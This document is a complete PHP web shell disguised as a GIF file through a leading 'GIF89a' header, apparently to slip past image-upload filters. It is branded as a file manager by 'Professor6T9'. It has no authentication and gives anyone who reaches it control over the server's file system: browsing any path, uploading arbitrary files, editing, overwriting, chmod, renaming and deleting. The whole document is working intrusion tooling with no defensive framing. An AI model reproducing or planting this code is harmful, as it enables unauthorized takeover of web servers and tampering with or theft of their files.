GIF89a

<?php
/* GIF89a */

$home = $_SERVER['HOME'] ?? '/';
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) $path = getcwd();
$uploadSuccess = false;
$fileLink = '';
$currentYear = date("Y");
$editContent = '';
$editTarget = '';

function h($str) { return htmlspecialchars($str, ENT_QUOTES); }

// Handle Upload
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['upload'])) {
        $dest = $path . '/' . basename($_FILES['upload']['name']);
        if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
            $uploadSuccess = true;
            $fileLink = basename($dest);
        }
    } elseif (isset($_POST['chmod'], $_POST['file'])) {
        chmod($path . '/' . $_POST['file'], intval($_POST['chmod'], 8));
    } elseif (isset($_POST['savefile'], $_POST['filename'])) {
        file_put_contents($path . '/' . $_POST['filename'], $_POST['savefile']);
    } elseif (isset($_POST['rename'], $_POST['oldname'])) {
        rename($path . '/' . $_POST['oldname'], $path . '/' . $_POST['rename']);
    }
}

// Handle Edit
if (isset($_GET['edit'])) {
    $editTarget = basename($_GET['edit']);
    $editPath = $path . '/' . $editTarget;
    if (is_file($editPath)) {
        $editContent = htmlspecialchars(file_get_contents($editPath));
    }
}

// Handle Delete
if (isset($_GET['delete'])) {
    $target = $path . '/' . basename($_GET['delete']);
    if (is_file($target)) {
        unlink($target);
        header("Location: ?path=" . urlencode($path));
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>📁</title>
    <style>
        body { background: #111; color: #eee; font-family: monospace; padding: 20px; }
        a { color: #6cf; text-decoration: none; }
        a:hover { text-decoration: underline; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #1c1c1c; }
        th, td { padding: 8px; border: 1px solid #333; text-align: left; }
        th { background: #2a2a2a; }
        input, button, textarea {
            background: #222; color: #eee; border: 1px solid #444; padding: 5px;
            border-radius: 4px; font-family: monospace;
        }
        button { background: #6cf; color: #000; font-weight: bold; cursor: pointer; }
        .breadcrumb a { color: #ccc; margin-right: 5px; }
        .breadcrumb span { color: #888; margin: 0 4px; }
        .card { background: #1c1c1c; padding: 15px; border-radius: 8px; box-shadow: 0 0 10px #000; margin-top: 20px; }
        textarea { width: 100%; height: 300px; margin-top: 10px; }
        footer { text-align: center; margin-top: 40px; color: #666; font-size: 0.9em; }
    </style>
    <?php if ($uploadSuccess): ?>
    <script>alert("✅ File uploaded successfully!");</script>
    <?php endif; ?>
</head>
<body>

<h2>📁 File Manager By Professor6T9</h2>

<!-- Change Directory -->
<form method="get">
    <label>📂 Change Directory:</label>
    <input type="text" name="path" value="<?= h($path) ?>" style="width:60%;">
    <button type="submit">Go</button>
</form>

<!-- Breadcrumbs -->
<div class="breadcrumb">
    <?php
    $crumbs = explode('/', trim($path, '/'));
    $accum = '';
    echo '<a href="?path=/">/</a>';
    foreach ($crumbs as $crumb) {
        $accum .= '/' . $crumb;
        echo '<span>/</span><a href="?path=' . urlencode($accum) . '">' . h($crumb) . '</a>';
    }
    echo '<span>/</span><a href="?path=' . urlencode($home) . '">[ HOME ]</a>';
    ?>
</div>

<!-- Parent Dir -->
<?php if (dirname($path) !== $path): ?>
<p><a href="?path=<?= urlencode(dirname($path)) ?>">⬅️ [ PARENT DIR ]</a></p>
<?php endif; ?>

<!-- Upload -->
<div class="card">
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="upload" required>
        <button type="submit">📤 Upload</button>
    </form>
    <?php if ($fileLink): ?>
        <p><b>Link:</b> <a href="<?= h($fileLink) ?>" target="_blank"><?= h($fileLink) ?></a></p>
    <?php endif; ?>
</div>

<!-- Edit File -->
<?php if ($editTarget): ?>
<div class="card">
    <form method="post">
        <input type="hidden" name="filename" value="<?= h($editTarget) ?>">
        <textarea name="savefile"><?= $editContent ?></textarea><br>
        <button type="submit">💾 Save</button>
    </form>
</div>
<?php endif; ?>

<!-- File List -->
<div class="card">
    <table>
        <tr>
            <th>Name</th><th>Size (kB)</th><th>Modified</th><th>Year</th><th>Perms</th><th>Actions</th>
        </tr>
        <?php
        $items = scandir($path);
        $dirs = $files = [];

        foreach ($items as $item) {
            if ($item === '.') continue;
            if (is_dir($path . '/' . $item)) {
                $dirs[] = $item;
            } else {
                $files[] = $item;
            }
        }

        $all = array_merge($dirs, $files);

        foreach ($all as $item) {
            $full = $path . '/' . $item;
            $isDir = is_dir($full);
            $perm = substr(sprintf('%o', fileperms($full)), -4);
            $mtime = filemtime($full);
            $size = $isDir ? '-' : round(filesize($full) / 1024, 2);
            $year = date("Y", $mtime);
            $date = date("Y-m-d H:i:s", $mtime);

            echo '<tr>';
            echo '<td>';
            echo $isDir ? '<a href="?path=' . urlencode($full) . '">📁 ' . h($item) . '</a>' : '📄 ' . h($item);
            echo '</td>';
            echo "<td>$size</td><td>$date</td><td>$year</td>";
            echo '<td>
                <form method="post" style="display:inline;">
                    <input type="hidden" name="file" value="' . h($item) . '">
                    <input type="text" name="chmod" value="' . $perm . '" size="4">
                    <button>Set</button>
                </form>
            </td>';
            echo '<td>';
            if (!$isDir) {
                echo '<a href="?path=' . urlencode($path) . '&edit=' . urlencode($item) . '">✏️ Edit</a> | ';
                echo '<a href="?path=' . urlencode($path) . '&delete=' . urlencode($item) . '" onclick="return confirm(\'Delete?\')">🗑️</a> | ';
                echo '<a href="' . h($item) . '" download>⬇️</a> | ';
                echo '<form method="post" style="display:inline;">
                        <input type="hidden" name="oldname" value="' . h($item) . '">
                        <input type="text" name="rename" value="' . h($item) . '" size="10">
                        <button>✏️</button>
                    </form>';
            } else {
                echo '-';
            }
            echo '</td></tr>';
        }
        ?>
    </table>
</div>

<footer>
    © <?= $currentYear ?> | File Manager by <a href="http://t.me/Professor6T9" target="_blank">@Professor6T9</a>
</footer>

</body>
</html>
